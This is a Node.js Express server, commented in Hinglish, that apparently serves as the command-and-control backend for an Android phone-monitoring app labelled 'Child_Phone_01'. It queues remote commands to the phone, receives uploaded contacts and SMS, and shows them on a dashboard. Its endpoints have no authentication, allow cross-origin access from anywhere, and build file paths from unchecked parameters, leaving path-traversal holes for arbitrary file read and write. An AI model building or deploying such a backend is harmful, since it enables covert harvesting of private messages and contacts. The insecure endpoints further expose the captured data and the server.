const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// --- 1. SETTINGS ---
// Data kahan save hoga?
const UPLOADS_DIR = path.join(__dirname, 'uploads');

// Agar folder nahi hai to bana lo
if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR);
    console.log("📂 'uploads' folder created successfully.");
}

// Middleware (Security & Data Size)
app.use(cors()); // Allow connection from anywhere
app.use(bodyParser.json({ limit: '50mb' })); // Allow big files (Photos/Contacts)
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname)); // Index.html ko dikhane ke liye

// RAM Storage (Temporary Status Store)
let devices = {}; 

// ==================================================
// 📲 PHONE SIDE (Android App yahan baat karega)
// ==================================================

// 1. Phone Status Update karega & Command Check karega
// Ye sabse IMPORTANT part hai.
app.post('/api/update-status', (req, res) => {
    const { device_id, model, battery, android_version, isCharging } = req.body;

    // Default ID agar phone na bheje
    const id = device_id || "Child_Phone_01";

    // Status save karo
    if (!devices[id]) devices[id] = {};
    
    // Command check karo (Jo pending hai)
    const pendingCommand = devices[id].command || "none";

    // Update Device State
    devices[id] = {
        model: model || "Unknown Mobile",
        battery: battery || 0,
        android_version: android_version || "--",
        isCharging: isCharging || false,
        lastSeen: Date.now(),
        command: "none" // Command bhejne ke baad clear kar do
    };

    console.log(`📡 Ping from ${id} | Battery: ${battery}% | Command Sent: ${pendingCommand}`);

    // Phone ko Command wapas bhejo
    res.json({
        status: "success",
        command: pendingCommand
    });
});

// 2. Phone Data Upload karega (Contacts, SMS, etc)
app.post('/api/upload-data', (req, res) => {
    const { device_id, type, data } = req.body;
    const id = device_id || "Child_Phone_01";

    console.log(`📥 Data Received from ${id}: [${type}]`);

    // File ka naam: Child_Phone_01_contacts.json
    const fileName = `${id}_${type}.json`;
    const filePath = path.join(UPLOADS_DIR, fileName);

    try {
        // Data ko file mein save karo
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
        console.log(`✅ Saved to: ${fileName}`);
        res.json({ status: "success", message: "Data Saved" });
    } catch (error) {
        console.error("❌ Save Error:", error);
        res.status(500).json({ status: "error", message: "Save failed" });
    }
});


// ==================================================
// 💻 DASHBOARD SIDE (Tumhari Website yahan baat karegi)
// ==================================================

// 1. Website Status Check karegi
app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id;
    const device = devices[id];

    if (!device) {
        // Agar phone abhi tak connect nahi hua
        return res.json({ 
            isOnline: false, 
            battery: 0, 
            model: "Waiting...",
            message: "Device not connected yet"
        });
    }

    // Agar 60 second se jyada ho gaye to Offline maano
    const isOnline = (Date.now() - device.lastSeen) < 60000;

    res.json({
        ...device,
        isOnline: isOnline
    });
});

// 2. Website se Command Bhejo
app.post('/api/send-command', (req, res) => {
    const { device_id, command } = req.body;
    const id = device_id || "Child_Phone_01";

    if (!devices[id]) devices[id] = {};

    // Command queue mein daal do
    devices[id].command = command;
    
    console.log(`🚀 Admin sent command: [${command}] to ${id}`);
    res.json({ status: "success", message: `Command '${command}' queued.` });
});

// 3. Website Data Mangegi (View Contacts/SMS)
app.get('/api/get-data/:id/:type', (req, res) => {
    const { id, type } = req.params;
    const fileName = `${id}_${type}.json`;
    const filePath = path.join(UPLOADS_DIR, fileName);

    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]); // Empty list agar file nahi hai
    }
});

// --- Server Start ---
app.listen(PORT, () => {
    console.log(`=========================================`);
    console.log(`🔥 SERVER STARTED ON PORT ${PORT}`);
    console.log(`📂 Data Folder: ${UPLOADS_DIR}`);
    console.log(`=========================================`);
});
